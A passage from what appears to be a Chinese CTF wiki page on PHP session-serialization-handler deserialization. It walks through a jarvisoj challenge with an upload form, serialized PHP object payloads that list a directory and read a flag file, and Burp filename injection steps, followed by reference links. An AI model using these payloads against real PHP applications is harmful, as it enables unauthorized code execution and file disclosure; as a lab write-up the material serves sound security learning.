<div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;http://web.jarvisoj.com:32784/index.php&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;multipart/form-data&quot;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;777&quot;</span> <span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;file&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;file&quot;</span> <span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="p">/&gt;</span>
<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</pre></div>

<p>接下来构造序列化payload</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;session.serialize_handler&#39;</span><span class="p">,</span> <span class="s1">&#39;php_serialize&#39;</span><span class="p">);</span>
<span class="nb">session_start</span><span class="p">();</span>
<span class="k">class</span> <span class="nc">OowoO</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="nv">$mdzz</span><span class="o">=</span><span class="s1">&#39;print_r(scandir(dirname(__FILE__)));&#39;</span><span class="p">;</span>
<span class="p">}</span>
<span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">OowoO</span><span class="p">();</span>
<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$obj</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<p>由于采用Burp发包，为防止双引号被转义，在双引号前加上<code>\</code>，除此之外还要加上<code>|</code></p>
<p>在这个页面随便上传一个文件，然后抓包修改<code>filename</code>的值</p>
<p><img alt="" src="12.png" /></p>
<p>可以看到<code>Here_1s_7he_fl4g_buT_You_Cannot_see.php</code>这个文件，flag肯定在里面，但还有一个问题就是不知道这个路径，路径的问题就需要回到phpinfo页面去查看</p>
<p><img alt="" src="13.png" /></p>
<p>因此我们只需要把payload，当中改为<code>print_r(file_get_contents("/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php"));</code>即可获取flag</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;session.serialize_handler&#39;</span><span class="p">,</span> <span class="s1">&#39;php_serialize&#39;</span><span class="p">);</span>
<span class="nb">session_start</span><span class="p">();</span>
<span class="k">class</span> <span class="nc">OowoO</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="nv">$mdzz</span><span class="o">=</span><span class="s1">&#39;print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));&#39;</span><span class="p">;</span>
<span class="p">}</span>
<span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">OowoO</span><span class="p">();</span>
<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$obj</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<h1 id="_15">参考文章<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h1>
<p><a href="https://xz.aliyun.com/t/2715">https://xz.aliyun.com/t/2715</a></p>
<p><a href="https://xz.aliyun.com/t/2613">https://xz.aliyun.com/t/2613</a></p>
<p><a href="https://threezh1.com/2019/09/09/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://threezh1.com/2019/09/09/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p>
<p><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf">https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf</a></p>
<p><a href="https://blog.csdn.net/qq_43431158/article/details/99544797">https://blog.csdn.net/qq_43431158/article/details/99544797</a></p>
<p><a href="https://www.cnblogs.com/or4nge/p/13439974.html">https://www.cnblogs.com/or4nge/p/13439974.html</a></p>
<p><a href="https://blog.zsxsoft.com/post/38">https://blog.zsxsoft.com/post/38</a></p>
<p><a href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></p>
<p><a href="https://www.freebuf.com/articles/web/182231.html">https://www.freebuf.com/articles/web/182231.html</a></p>
<p><a href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p>
                
                  
                
              
              
                


  <h2 id="__comments">评论</h2>
  <div id="disqus_thread"></div>
  <script>
    var disqus_config = function () {
      this.page.url = "None";
      this.page.identifier =
        "None";
    };
    (function() {
      var d = document, s = d.createElement("script");
      s.src = "//scu-ctf.disqus.com/embed.js";
      s.setAttribute("data-timestamp", +new Date());
      (d.head || d.body).appendChild(s);
    })();
  </script>

              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../../SSRF/SSRF简要介绍/" title="SSRF介绍" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  后退
                </span>
                SSRF介绍
              </span>
            </div>
          </a>
        
        
          <a href="../../XXE/XXE/" title="XXE" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  前进
                </span>
                XXE
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
        powered by
        <a href="https://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../../../assets/javascripts/application.2ba8dec4.js"></script>
      
        
        
          
          <script src="../../../../assets/javascripts/lunr/lunr.stemmer.support.js"></script>
          
            
              
              
            
          
          
        
      
      <script>app.initialize({version:"1.0.4",url:{base:"../../../.."}})</script>
      
        <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
      
        <script src="../../../../_static/js/extra.js"></script>
      
        <script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
      
    
  </body>
</html>